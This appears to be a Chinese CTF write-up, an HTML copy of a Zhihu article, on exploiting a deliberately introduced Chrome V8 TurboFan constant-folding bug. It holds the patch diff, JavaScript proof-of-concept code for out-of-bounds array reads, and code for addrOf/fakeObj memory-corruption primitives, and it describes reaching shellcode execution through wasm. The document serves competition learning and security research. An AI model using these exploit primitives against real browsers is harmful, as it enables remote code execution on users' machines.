<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<title>利用边界检查消除破解Chrome JIT编译器</title>
</head>
<body>
<p><a href="https://zhuanlan.zhihu.com/p/73081003">原文</a></p>
<div class="title-image"><img src="https://pic3.zhimg.com/v2-59a2e77297e95f03b3e2501f86df563b_b.jpg" alt=""></div><p>本文共同作者: shiki7(<a href="https://link.zhihu.com/?target=https%3A//twitter.com/Marche147" class=" wrap external" target="_blank" rel="nofollow noreferrer">@Marche147</a>)</p><p>本文将介绍一场CTF(强网杯CTF决赛)中的Chrome V8 TurboFan编译器赛题的漏洞利用。赛题由最新版本chromium修改而来。经作者引入刻意漏洞后考察选手构造v8 JIT poc及编写漏洞利用的情况。目标chromium以 --no-sandbox 模式运行，在完成远程代码执行后方可获取flag。</p><p>在利用过程中，我们先通过V8边界检查消除优化把编译器bug转变为数组off-by-one bug。之后通过堆排布与计算获取了稳定且可复用的 addrOf 和 fakeObj 原语。最终实现稳定的远程代码执行。</p><p>另外，如果你热爱此类real-world风格的CTF赛题，也请保持关注<a href="https://link.zhihu.com/?target=https%3A//realworldctf.com/" class=" wrap external" target="_blank" rel="nofollow noreferrer">Real World CTF</a>。</p><h2>漏洞描述</h2><div class="highlight"><pre><code class="language-cpp"><span class="n">diff</span> <span class="o">--</span><span class="n">git</span> <span class="n">a</span><span class="o">/</span><span class="n">src</span><span class="o">/</span><span class="n">compiler</span><span class="o">/</span><span class="n">machine</span><span class="o">-</span><span class="k">operator</span><span class="o">-</span><span class="n">reducer</span><span class="p">.</span><span class="n">cc</span> <span class="n">b</span><span class="o">/</span><span class="n">src</span><span class="o">/</span><span class="n">compiler</span><span class="o">/</span><span class="n">machine</span><span class="o">-</span><span class="k">operator</span><span class="o">-</span><span class="n">reducer</span><span class="p">.</span><span class="n">cc</span>
<span class="n">index</span> <span class="n">a6a8e87cf4</span><span class="p">.</span><span class="mf">.164</span><span class="n">ab44fab</span> <span class="mi">100644</span>
<span class="o">---</span> <span class="n">a</span><span class="o">/</span><span class="n">src</span><span class="o">/</span><span class="n">compiler</span><span class="o">/</span><span class="n">machine</span><span class="o">-</span><span class="k">operator</span><span class="o">-</span><span class="n">reducer</span><span class="p">.</span><span class="n">cc</span>
<span class="o">+++</span> <span class="n">b</span><span class="o">/</span><span class="n">src</span><span class="o">/</span><span class="n">compiler</span><span class="o">/</span><span class="n">machine</span><span class="o">-</span><span class="k">operator</span><span class="o">-</span><span class="n">reducer</span><span class="p">.</span><span class="n">cc</span>
<span class="err">@@</span> <span class="o">-</span><span class="mi">291</span><span class="p">,</span><span class="mi">7</span> <span class="o">+</span><span class="mi">291</span><span class="p">,</span><span class="mi">7</span> <span class="err">@@</span> <span class="n">Reduction</span> <span class="n">MachineOperatorReducer</span><span class="o">::</span><span class="n">Reduce</span><span class="p">(</span><span class="n">Node</span><span class="o">*</span> <span class="n">node</span><span class="p">)</span> <span class="p">{</span>
       <span class="k">if</span> <span class="p">(</span><span class="n">m</span><span class="p">.</span><span class="n">left</span><span class="p">().</span><span class="n">Is</span><span class="p">(</span><span class="n">kMaxUInt32</span><span class="p">))</span> <span class="k">return</span> <span class="n">ReplaceBool</span><span class="p">(</span><span class="nb">false</span><span class="p">);</span>  <span class="c1">// M &lt; x =&gt; false
</span><span class="c1"></span>       <span class="k">if</span> <span class="p">(</span><span class="n">m</span><span class="p">.</span><span class="n">right</span><span class="p">().</span><span class="n">Is</span><span class="p">(</span><span class="mi">0</span><span class="p">))</span> <span class="k">return</span> <span class="n">ReplaceBool</span><span class="p">(</span><span class="nb">false</span><span class="p">);</span>          <span class="c1">// x &lt; 0 =&gt; false
</span><span class="c1"></span>       <span class="k">if</span> <span class="p">(</span><span class="n">m</span><span class="p">.</span><span class="n">IsFoldable</span><span class="p">())</span> <span class="p">{</span>                                    <span class="c1">// K &lt; K =&gt; K
</span><span class="c1"></span><span class="o">-</span>        <span class="k">return</span> <span class="n">ReplaceBool</span><span class="p">(</span><span class="n">m</span><span class="p">.</span><span class="n">left</span><span class="p">().</span><span class="n">Value</span><span class="p">()</span> <span class="o">&lt;</span> <span class="n">m</span><span class="p">.</span><span class="n">right</span><span class="p">().</span><span class="n">Value</span><span class="p">());</span>
<span class="o">+</span>        <span class="k">return</span> <span class="n">ReplaceBool</span><span class="p">(</span><span class="n">m</span><span class="p">.</span><span class="n">left</span><span class="p">().</span><span class="n">Value</span><span class="p">()</span> <span class="o">&lt;</span> <span class="n">m</span><span class="p">.</span><span class="n">right</span><span class="p">().</span><span class="n">Value</span><span class="p">()</span> <span class="o">+</span> <span class="mi">1</span><span class="p">);</span>
       <span class="p">}</span>
       <span class="k">if</span> <span class="p">(</span><span class="n">m</span><span class="p">.</span><span class="n">LeftEqualsRight</span><span class="p">())</span> <span class="k">return</span> <span class="n">ReplaceBool</span><span class="p">(</span><span class="nb">false</span><span class="p">);</span>  <span class="c1">// x &lt; x =&gt; false
</span><span class="c1"></span>       <span class="k">if</span> <span class="p">(</span><span class="n">m</span><span class="p">.</span><span class="n">left</span><span class="p">().</span><span class="n">IsWord32Sar</span><span class="p">()</span> <span class="o">&amp;&amp;</span> <span class="n">m</span><span class="p">.</span><span class="n">right</span><span class="p">().</span><span class="n">HasValue</span><span class="p">())</span> <span class="p">{</span>
</code></pre></div><p>这是一个非常有趣的patch，因为它只用了两个字符。它作用于一个较晚的TurboFan优化阶段: <code><a href="https://link.zhihu.com/?target=https%3A//cs.chromium.org/chromium/src/v8/src/compiler/machine-operator-reducer.cc%3Fg%3D0%26l%3D289" class=" wrap external" target="_blank" rel="nofollow noreferrer">MachineOperatorReducer</a></code> 。</p><p>中间表示 kUint32LessThan 用于比较两个uint32类型数字。在<a href="https://link.zhihu.com/?target=https%3A//cs.chromium.org/chromium/src/v8/src/compiler/machine-operator-reducer.cc%3Fg%3D0%26l%3D289" class=" wrap external" target="_blank" rel="nofollow noreferrer">MachineOperatorReducer</a> 这个优化中，编译器会尝试把确定性的比较操作直接优化为一个布尔常量。例如，对于任意的 <img src="https://www.zhihu.com/equation?tex=%5Ctheta" alt="\theta" eeimg="1"/> ， <img src="https://www.zhihu.com/equation?tex=kMaxUint32+%3C+%5Ctheta" alt="kMaxUint32 &lt; \theta" eeimg="1"/> 都会被直接折叠为 <img src="https://www.zhihu.com/equation?tex=False" alt="False" eeimg="1"/> 。同样，对于常数之间的比较，编译器也会将其折叠。例如， <img src="https://www.zhihu.com/equation?tex=4+%3C+4" alt="4 &lt; 4" eeimg="1"/> 会被直接折叠为 <img src="https://www.zhihu.com/equation?tex=False" alt="False" eeimg="1"/> 。</p><p>这个patch在进行折叠时引入了一个错误，因为它在判断时将右值进行了加一，导致了在一些情况下折叠会出错。例如 <img src="https://www.zhihu.com/equation?tex=4+%3C+4+%28False%29" alt="4 &lt; 4 (False)" eeimg="1"/> 会被当做 <img src="https://www.zhihu.com/equation?tex=4+%3C+5+%28True%29" alt="4 &lt; 5 (True)" eeimg="1"/> 。</p><p>直观上来看，这个bug并不能直接导致内存破坏，我们必须要把它转换为更强大的漏洞利用原语。</p><h2>边界检查消除 (Bounds Check Elimination)</h2><p>通过数组访问边界检查消除这个优化，先前已有很多V8 typer的bug被成功利用。(例如: CVE-2019-5782) 。因此，我们首先想到能否采用类似的方式利用这个漏洞。</p><p>然而，因为这种漏洞利用方式太过于方便，可以将一个很严苛的漏洞转变成数组任意越界，chrome开发者为了增强V8抵御此类漏洞的能力,决定去掉<code>Simplified lowering</code>过程中的边界检查优化。</p><p>幸运的是，我们注意到依然有一些类似的bug可以利用。例如，Jeremy Fetiveau在<a href="https://link.zhihu.com/?target=https%3A//doar-e.github.io/blog/2019/05/09/circumventing-chromes-hardening-of-typer-bugs/" class=" wrap external" target="_blank" rel="nofollow noreferrer">他的文章</a>中提到的String#lastIndexOf 漏洞的利用。在阅读其文章时，我们发现边界检查消除的漏洞利用技巧还是有机会继续使用的。</p><h2>寻找合适的路径消除边界检查</h2><p>首先，为了方便我们的分析。我们可以使用D8的--trace-turbo选项和turbolizer来查看TurboFan优化过程中的Sea of Nodes中间表示。</p><p>目前，尽管simplified lowering在优化时已经不再会移除 CheckBound这个节点了，但是它会把CheckBounds替换为一个CheckedUint32Bounds节点(<a href="https://link.zhihu.com/?target=https%3A//cs.chromium.org/chromium/src/v8/src/compiler/simplified-lowering.cc%3Fg%3D0%26l%3D1602" class=" wrap external" target="_blank" rel="nofollow noreferrer">参考代码</a>)。如此一来，在Effect Control Linearization优化阶段，<code>CheckedUint32Bounds</code>又会被进一步替换为Uint32LessThan。根据Uint32LessThan比较的结果，TurboFan会产生一个 LoadElement节点或者是一个Unreachable节点(<a href="https://link.zhihu.com/?target=https%3A//cs.chromium.org/chromium/src/v8/src/compiler/effect-control-linearizer.cc%3Fg%3D0%26l%3D2376" class=" wrap external" target="_blank" rel="nofollow noreferrer">参考代码</a>)</p><p>例如，对于如下代码，</p><div class="highlight"><pre><code class="language-js"><span class="kd">function</span> <span class="nx">opt</span><span class="p">(){</span>
	<span class="kd">let</span> <span class="nx">arr</span> <span class="o">=</span> <span class="p">[</span><span class="mi">0</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">3</span><span class="p">];</span>
	<span class="kd">let</span> <span class="nx">idx</span> <span class="o">=</span> <span class="mi">3</span><span class="p">;</span>
	<span class="k">return</span> <span class="nx">arr</span><span class="p">[</span><span class="nx">idx</span><span class="p">];</span>
<span class="p">}</span>

<span class="k">for</span><span class="p">(</span><span class="kd">var</span> <span class="nx">i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="mh">0x10000</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">)</span>
    <span class="nx">opt</span><span class="p">()</span>

<span class="kd">var</span> <span class="nx">x</span> <span class="o">=</span> <span class="nx">opt</span><span class="p">()</span>
<span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">x</span><span class="p">)</span>

<span class="c1">// output
</span><span class="c1"></span><span class="nx">$</span> <span class="p">.</span><span class="o">/</span><span class="nx">d8</span> <span class="p">.</span><span class="o">/</span><span class="nx">test</span><span class="p">.</span><span class="nx">js</span>
<span class="nx">$</span> <span class="mi">3</span>
</code></pre></div><p><br/>编译器会产生如下中间表示。它正确的消除了边界检查，提供了更高的性能。</p><figure data-size="normal"><noscript><img src="https://pic4.zhimg.com/v2-8117120e5ef58d5e533f45932ccc298f_b.jpg" data-size="normal" data-rawwidth="2598" data-rawheight="1472" class="origin_image zh-lightbox-thumb" width="2598" data-original="https://pic4.zhimg.com/v2-8117120e5ef58d5e533f45932ccc298f_r.jpg"/></noscript><img src="https://pic4.zhimg.com/v2-8117120e5ef58d5e533f45932ccc298f_b.jpg" data-size="normal" data-rawwidth="2598" data-rawheight="1472" class="origin_image zh-lightbox-thumb lazy" width="2598" data-original="https://pic4.zhimg.com/v2-8117120e5ef58d5e533f45932ccc298f_r.jpg" data-actualsrc="https://pic4.zhimg.com/v2-8117120e5ef58d5e533f45932ccc298f_b.jpg"/><figcaption>边界检查消除过程</figcaption></figure><p class="ztext-empty-paragraph"><br/></p><p>因为 <img src="https://www.zhihu.com/equation?tex=%283+%3C+4%29+%5Cequiv+True" alt="(3 &lt; 4) \equiv True" eeimg="1"/> ，所以在没有任何边界检查情况下，最终的机器码直接加载了数组里的元素。</p><p>现在，利用这个漏洞的思路已经非常清楚了：使用Uint32LessThan产生的错误结果来消除数组访问时的边界检查。</p><h2>常数折叠和两种绕过它的方法</h2><p>根据以上的思路，我们来进行初步的尝试并期望有按照我们预期的OOB数组访问出现。</p><div class="highlight"><pre><code class="language-js"><span class="kd">function</span> <span class="nx">opt</span><span class="p">()</span> <span class="p">{</span>
    <span class="kd">let</span> <span class="nx">arr</span> <span class="o">=</span> <span class="p">[</span><span class="mi">0</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">3</span><span class="p">];</span>
    <span class="kd">let</span> <span class="nx">idx</span> <span class="o">=</span> <span class="mi">4</span><span class="p">;</span>
    <span class="k">return</span> <span class="nx">arr</span><span class="p">[</span><span class="nx">idx</span><span class="p">];</span>
<span class="p">}</span>

<span class="p">...</span>

<span class="c1">// output
</span><span class="c1"></span><span class="nx">$</span> <span class="p">.</span><span class="o">/</span><span class="nx">d8</span> <span class="p">.</span><span class="o">/</span><span class="nx">test</span><span class="p">.</span><span class="nx">js</span>
<span class="nx">$</span> <span class="kc">undefined</span>
</code></pre></div><p>不幸的是，以上代码并没有造成越界访问并返回了undefined。</p><p>经过一些试验和调研，我们最终注意到LoadElement节点消失了。</p><figure data-size="normal"><noscript><img src="https://pic1.zhimg.com/v2-f75d4c568975ba90e280dba9bbd53b74_b.jpg" data-size="normal" data-rawwidth="2062" data-rawheight="926" class="origin_image zh-lightbox-thumb" width="2062" data-original="https://pic1.zhimg.com/v2-f75d4c568975ba90e280dba9bbd53b74_r.jpg"/></noscript><img src="https://pic1.zhimg.com/v2-f75d4c568975ba90e280dba9bbd53b74_b.jpg" data-size="normal" data-rawwidth="2062" data-rawheight="926" class="origin_image zh-lightbox-thumb lazy" width="2062" data-original="https://pic1.zhimg.com/v2-f75d4c568975ba90e280dba9bbd53b74_r.jpg" data-actualsrc="https://pic1.zhimg.com/v2-f75d4c568975ba90e280dba9bbd53b74_b.jpg"/><figcaption>LoadElement节点在LoadElimination优化阶段后消失</figcaption></figure><p>最终我们发现idx变量被LoadElimination中的常数折叠直接去掉了。为了避免掉常数折叠，我们需要赋予CheckBound一个不确定的范围。</p><p>因此我们选择了在idx这个变量上进行一些算术操作。</p><div class="highlight"><pre><code class="language-js"><span class="kd">function</span> <span class="nx">opt</span><span class="p">(){</span>
 <span class="kd">let</span> <span class="nx">arr</span> <span class="o">=</span> <span class="p">[</span><span class="mf">1.1</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">3</span><span class="p">,</span> <span class="mi">5</span><span class="p">]</span>

 <span class="kd">let</span> <span class="nx">idx</span> <span class="o">=</span> <span class="mi">4</span><span class="p">;</span>
 <span class="nx">idx</span> <span class="o">&amp;=</span> <span class="mh">0xfff</span><span class="p">;</span>
 <span class="k">return</span> <span class="nx">arr</span><span class="p">[</span><span class="nx">idx</span><span class="p">];</span>
<span class="p">}</span>

<span class="p">...</span>

<span class="c1">// output
</span><span class="c1"></span><span class="nx">$</span> <span class="p">.</span><span class="o">/</span><span class="nx">d8</span> <span class="p">.</span><span class="o">/</span><span class="nx">test</span><span class="p">.</span><span class="nx">js</span>
<span class="nx">$</span> <span class="mf">8.714350797546e-311</span>
</code></pre></div><figure data-size="normal"><noscript><img src="https://pic4.zhimg.com/v2-f032049790b75d9ed3c3aebbce50f11f_b.jpg" data-size="normal" data-rawwidth="656" data-rawheight="370" class="origin_image zh-lightbox-thumb" width="656" data-original="https://pic4.zhimg.com/v2-f032049790b75d9ed3c3aebbce50f11f_r.jpg"/></noscript><img src="https://pic4.zhimg.com/v2-f032049790b75d9ed3c3aebbce50f11f_b.jpg" data-size="normal" data-rawwidth="656" data-rawheight="370" class="origin_image zh-lightbox-thumb lazy" width="656" data-original="https://pic4.zhimg.com/v2-f032049790b75d9ed3c3aebbce50f11f_r.jpg" data-actualsrc="https://pic4.zhimg.com/v2-f032049790b75d9ed3c3aebbce50f11f_b.jpg"/><figcaption>常数折叠已被避免</figcaption></figure><p>Cool! 我们可以从代码中观察到越界访问已经发生并把越界的读取的数据返回了! 从技术角度上来讲，我们现在完全可以使用这个技巧完成整个漏洞利用了。</p><p>但是，我个人还是更喜欢另外一种更有趣的方式: 逃逸分析</p><h2>逃逸分析</h2><p>逃逸分析这种优化可以用来移除临时分配的对象。</p><p>例如，在如下代码中，因为&#34;o&#34; 这个对象是非逃逸的，所以&#34;o&#34;这个对象会在逃逸分析中被直接删掉。</p><div class="highlight"><pre><code class="language-js"><span class="c1">// before escape analysis
</span><span class="c1"></span><span class="kd">function</span> <span class="nx">foo</span><span class="p">()</span> <span class="p">{</span>
    <span class="kd">var</span> <span class="nx">o</span> <span class="o">=</span> <span class="p">{</span><span class="nx">x</span><span class="o">:</span> <span class="mi">1</span><span class="p">,</span> <span class="nx">y</span><span class="o">:</span><span class="mi">2</span><span class="p">};</span>
    <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">o</span><span class="p">.</span><span class="nx">x</span><span class="p">);</span>
<span class="p">}</span>

<span class="c1">// after escape analysis
</span><span class="c1"></span><span class="kd">function</span> <span class="nx">foo</span><span class="p">()</span> <span class="p">{</span>
    <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div><p>因为逃逸分析在LoadElimination和MachineOperatorReducer之间，所以我们可以把一个常数放在非逃逸对象中来避免常数折叠。</p><div class="highlight"><pre><code class="language-js"><span class="kd">function</span> <span class="nx">opt</span><span class="p">(){</span>
 <span class="kd">let</span> <span class="nx">arr</span> <span class="o">=</span> <span class="p">[</span><span class="mf">1.1</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">3</span><span class="p">,</span> <span class="mi">5</span><span class="p">];</span>

 <span class="kd">let</span> <span class="nx">o</span> <span class="o">=</span> <span class="p">{</span><span class="nx">x</span><span class="o">:</span> <span class="mi">4</span><span class="p">};</span>
 <span class="k">return</span> <span class="nx">arr</span><span class="p">[</span><span class="nx">o</span><span class="p">.</span><span class="nx">x</span><span class="p">];</span>
<span class="p">}</span>

<span class="p">...</span>

<span class="c1">// output
</span><span class="c1"></span>
<span class="nx">$</span> <span class="p">.</span><span class="o">/</span><span class="nx">d8</span> <span class="p">.</span><span class="o">/</span><span class="nx">test</span><span class="p">.</span><span class="nx">js</span>
<span class="nx">$</span> <span class="mf">1.99567061273097e-310</span>
</code></pre></div><p>到目前为止，现在我们已经成功把这个漏洞转换成了一个数组Off-By-One漏洞。</p><h2>利用数组Off-By-One漏洞</h2><figure data-size="normal"><noscript><img src="https://pic1.zhimg.com/v2-b9f64357944ae22d4c76f3470c5326e8_b.jpg" data-size="normal" data-rawwidth="1472" data-rawheight="590" class="origin_image zh-lightbox-thumb" width="1472" data-original="https://pic1.zhimg.com/v2-b9f64357944ae22d4c76f3470c5326e8_r.jpg"/></noscript><img src="https://pic1.zhimg.com/v2-b9f64357944ae22d4c76f3470c5326e8_b.jpg" data-size="normal" data-rawwidth="1472" data-rawheight="590" class="origin_image zh-lightbox-thumb lazy" width="1472" data-original="https://pic1.zhimg.com/v2-b9f64357944ae22d4c76f3470c5326e8_r.jpg" data-actualsrc="https://pic1.zhimg.com/v2-b9f64357944ae22d4c76f3470c5326e8_b.jpg"/><figcaption>V8中的对象表示</figcaption></figure><p>在V8中，对象的类型由它的Map成员来确定。因此，如果我们能把一个double数组的map替换为一个var数组的map, 那么我们就能得到一个type confusion的数组。</p><p>因为Map是JS对象的第一个成员变量，通过对堆和对象的排布，我们可以把两个数组挤在一起，然后用前一个数组去读写后一个的Map成员。</p><figure data-size="normal"><noscript><img src="https://pic2.zhimg.com/v2-eb2f933d17b20958d0af8beb8800fd5d_b.jpg" data-size="normal" data-rawwidth="1432" data-rawheight="494" class="origin_image zh-lightbox-thumb" width="1432" data-original="https://pic2.zhimg.com/v2-eb2f933d17b20958d0af8beb8800fd5d_r.jpg"/></noscript><img src="https://pic2.zhimg.com/v2-eb2f933d17b20958d0af8beb8800fd5d_b.jpg" data-size="normal" data-rawwidth="1432" data-rawheight="494" class="origin_image zh-lightbox-thumb lazy" width="1432" data-original="https://pic2.zhimg.com/v2-eb2f933d17b20958d0af8beb8800fd5d_r.jpg" data-actualsrc="https://pic2.zhimg.com/v2-eb2f933d17b20958d0af8beb8800fd5d_b.jpg"/><figcaption>利用Off-By-One来伪造对象的思路</figcaption></figure><p>现在的利用思路是: 构造出两个Off-By-One的数组，第一个用来信息泄露, 第二个用来伪造对象。上图展示了伪造对象的思路。</p><h2>堆风水</h2><figure data-size="small"><noscript><img src="https://pic3.zhimg.com/v2-d97c78f330ef715d3c1f6321f08716be_b.jpg" data-size="small" data-rawwidth="602" data-rawheight="554" class="origin_image zh-lightbox-thumb" width="602" data-original="https://pic3.zhimg.com/v2-d97c78f330ef715d3c1f6321f08716be_r.jpg"/></noscript><img src="https://pic3.zhimg.com/v2-d97c78f330ef715d3c1f6321f08716be_b.jpg" data-size="small" data-rawwidth="602" data-rawheight="554" class="origin_image zh-lightbox-thumb lazy" width="602" data-original="https://pic3.zhimg.com/v2-d97c78f330ef715d3c1f6321f08716be_r.jpg" data-actualsrc="https://pic3.zhimg.com/v2-d97c78f330ef715d3c1f6321f08716be_b.jpg"/><figcaption>实际调试过程中观察到的对象结构</figcaption></figure><p>很不幸的是，在试验上述思路的过程中，我们注意到堆的布局非常奇怪。数组的backstore总之在数组头之前。这导致了我们只能通过Off-By-One来读自己的Map。</p><p>这其实对于泄露double数组的map没有影响。然而，我们无法泄露var数组的map。因为var数组读出的map是以object的形式呈现的，这没有办法让我们知道它的地址值。</p><p>万幸的是，V8是用一个独立的堆来管理Map对象的，内存的布局在这个堆里还是较为稳定的。因此，我们可以为double数组map的地址加上固定的偏移来获取var数组的map地址。</p><h2>构建稳定的漏洞利用原语</h2><p>一开始，我们使用如下样式的代码来做信息泄露和对象伪造。</p><div class="highlight"><pre><code class="language-js"><span class="kd">var</span> <span class="nx">lkrefs</span> <span class="o">=</span> <span class="p">[];</span>

<span class="kd">function</span> <span class="nx">leaker</span><span class="p">(</span><span class="nx">obj</span><span class="p">)</span> <span class="p">{</span>
    <span class="kd">var</span> <span class="nx">a</span> <span class="o">=</span> <span class="p">[</span><span class="nx">obj</span><span class="p">,</span> <span class="nx">obj</span><span class="p">,</span> <span class="nx">obj</span><span class="p">,</span> <span class="nx">obj</span><span class="p">];</span>
    <span class="nx">lkrefs</span><span class="p">.</span><span class="nx">push</span><span class="p">(</span><span class="nx">a</span><span class="p">);</span>
    <span class="kd">var</span> <span class="nx">o</span> <span class="o">=</span> <span class="p">{</span><span class="nx">a</span><span class="o">:</span> <span class="mi">4</span><span class="p">};</span>
    <span class="nx">a</span><span class="p">[</span><span class="nx">o</span><span class="p">.</span><span class="nx">a</span><span class="p">]</span> <span class="o">=</span> <span class="p">[</span><span class="nx">double_map</span><span class="p">];</span>
    <span class="k">return</span> <span class="nx">a</span><span class="p">;</span>
<span class="p">}</span>

<span class="kd">function</span> <span class="nx">addrOf</span><span class="p">(</span><span class="nx">obj</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">for</span><span class="p">(</span><span class="kd">var</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="mi">12000</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
      <span class="kd">var</span> <span class="nx">ppp</span> <span class="o">=</span> <span class="nx">leaker</span><span class="p">(</span><span class="nx">obj</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="k">return</span> <span class="nx">ppp</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
<span class="p">}</span>

<span class="kd">function</span> <span class="nx">faker</span><span class="p">(</span><span class="nx">addr</span><span class="p">)</span> <span class="p">{</span>
    <span class="kd">var</span> <span class="nx">a</span> <span class="o">=</span> <span class="p">[</span><span class="nx">addr</span><span class="p">,</span> <span class="nx">addr</span><span class="p">,</span> <span class="nx">addr</span><span class="p">,</span> <span class="nx">addr</span><span class="p">];</span>
    <span class="nx">lkrefs</span><span class="p">.</span><span class="nx">push</span><span class="p">(</span><span class="nx">a</span><span class="p">);</span>
    <span class="kd">var</span> <span class="nx">o</span> <span class="o">=</span> <span class="p">{</span><span class="nx">a</span><span class="o">:</span> <span class="mi">4</span><span class="p">};</span>
    <span class="nx">a</span><span class="p">[</span><span class="nx">o</span><span class="p">.</span><span class="nx">a</span><span class="p">]</span> <span class="o">=</span> <span class="p">[</span><span class="nx">var_array_map</span><span class="p">];</span>
    <span class="k">return</span> <span class="nx">a</span><span class="p">;</span>
<span class="p">}</span>

<span class="kd">function</span> <span class="nx">fakeObj</span><span class="p">(</span><span class="nx">addr</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">for</span><span class="p">(</span><span class="kd">var</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="mi">12000</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
        <span class="kd">var</span> <span class="nx">ppp</span> <span class="o">=</span> <span class="nx">faker</span><span class="p">(</span><span class="nx">addr</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="k">return</span> <span class="nx">ppp</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
<span class="p">}</span>
</code></pre></div><p>然而, 这种方式非常的不稳定。如果我们用它太多次，V8就会触发垃圾回收导致我们伪造的对象全部被破坏，造成程序崩溃。</p><p>因此，我们通过用此原语来伪造一个数组，来构造更稳定的fake和leak原语。</p><div class="highlight"><pre><code class="language-js"><span class="kd">var</span> <span class="nx">o</span> <span class="o">=</span> <span class="p">{</span>
    <span class="nx">a</span><span class="o">:</span> <span class="mf">0.0</span><span class="p">,</span>
    <span class="nx">b</span><span class="o">:</span> <span class="p">[</span><span class="nx">map</span><span class="p">],</span>
    <span class="nx">c</span><span class="o">:</span> <span class="p">{},</span>
    <span class="nx">d</span><span class="o">:</span> <span class="nx">addrOf</span><span class="p">(</span><span class="nx">o</span><span class="p">),</span>
    <span class="nx">e</span><span class="o">:</span> <span class="mh">0x0000100400000000</span><span class="p">,</span>
    <span class="nx">f</span><span class="o">:</span> <span class="p">{}</span>
<span class="p">}</span>

<span class="nx">faked</span> <span class="o">=</span> <span class="nx">addrOf</span><span class="p">(</span><span class="nx">o</span><span class="p">)</span> <span class="o">+</span> <span class="mh">0x20</span><span class="p">;</span>

<span class="kd">var</span> <span class="nx">fake_arr</span> <span class="o">=</span> <span class="nx">fake_obj</span><span class="p">(</span><span class="nx">faked</span><span class="p">.</span><span class="nx">asDouble</span><span class="p">());</span>

<span class="c1">// we create a stable primitive
</span><span class="c1"></span><span class="kd">function</span> <span class="nx">addrof</span><span class="p">(</span><span class="nx">obj</span><span class="p">)</span> <span class="p">{</span>
    <span class="nx">o</span><span class="p">.</span><span class="nx">d</span> <span class="o">=</span> <span class="nx">addr_o</span><span class="p">.</span><span class="nx">asDouble</span><span class="p">();</span>
    <span class="nx">o</span><span class="p">.</span><span class="nx">b</span> <span class="o">=</span> <span class="p">[</span><span class="kd">var</span> <span class="nx">map</span><span class="p">];</span>
    <span class="nx">fake_arr</span><span class="p">[</span><span class="mi">7</span><span class="p">]</span> <span class="o">=</span> <span class="nx">obj</span><span class="p">;</span>
    <span class="nx">o</span><span class="p">.</span><span class="nx">b</span> <span class="o">=</span> <span class="p">[</span><span class="kr">double</span> <span class="nx">map</span><span class="p">];</span>
    <span class="k">return</span> <span class="nx">fake_arr</span><span class="p">[</span><span class="mi">7</span><span class="p">];</span>
<span class="p">}</span>

<span class="kd">function</span> <span class="nx">fakeobj</span><span class="p">(</span><span class="nx">addr</span><span class="p">)</span> <span class="p">{</span>
    <span class="nx">o</span><span class="p">.</span><span class="nx">d</span> <span class="o">=</span> <span class="nx">addr_o</span><span class="p">.</span><span class="nx">asDouble</span><span class="p">();</span>
    <span class="nx">o</span><span class="p">.</span><span class="nx">b</span> <span class="o">=</span> <span class="p">[</span><span class="kr">double</span> <span class="nx">map</span><span class="p">];</span>
    <span class="nx">fake_arr</span><span class="p">[</span><span class="mi">7</span><span class="p">]</span> <span class="o">=</span> <span class="nx">addr</span><span class="p">;</span>
    <span class="nx">o</span><span class="p">.</span><span class="nx">b</span> <span class="o">=</span> <span class="p">[</span><span class="kd">var</span> <span class="nx">map</span><span class="p">];</span>
    <span class="k">return</span> <span class="nx">fake_arr</span><span class="p">[</span><span class="mi">7</span><span class="p">];</span>
<span class="p">}</span>
</code></pre></div><h2>代码执行</h2><p>拥有了稳定的addrOf和fakeObj原语后，完成漏洞利用已如探囊取物。</p><p>我们直接跟着已有的方法来获取任意地址读写原语，之后通过覆盖掉wasm的代码完成了任意shellcode执行。</p><h2>Demo</h2><p>最终演示效果如下</p><a class="video-box" href="https://link.zhihu.com/?target=https%3A//www.zhihu.com/video/1132580930270945280" target="_blank" data-video-id="" data-video-playable="true" data-name="最终效果" data-poster="https://pic2.zhimg.com/v2-45543ee2ae5e4618abefeb774c2c10a9.jpg" data-lens-id="1132580930270945280"><img class="thumbnail" src="https://pic2.zhimg.com/v2-45543ee2ae5e4618abefeb774c2c10a9.jpg"/><span class="content"><span class="title">最终效果<span class="z-ico-extern-gray"></span><span class="z-ico-extern-blue"></span></span><span class="url"><span class="z-ico-video"></span>https://www.zhihu.com/video/1132580930270945280</span></span></a><h2>致谢</h2><p>感谢部分Tea Deliverers战队成员在本文章编写中提供的宝贵意见。感谢杨坤博士对本文进行的校对。</p><h2>参考资料</h2><p><a href="https://link.zhihu.com/?target=https%3A//abiondo.me/2019/01/02/exploiting-math-expm1-v8/" class=" wrap external" target="_blank" rel="nofollow noreferrer">Exploiting the Math.expm1 typing bug in V8</a><a href="https://link.zhihu.com/?target=https%3A//hackmd.io/BhJFLclYRw2f58XYu7h_GQ%3Fview%23fnref1" class=" wrap external" target="_blank" rel="nofollow noreferrer">↩︎</a></p><p><a href="https://link.zhihu.com/?target=https%3A//doar-e.github.io/blog/2019/01/28/introduction-to-turbofan/%23preparing-turbolizer" class=" 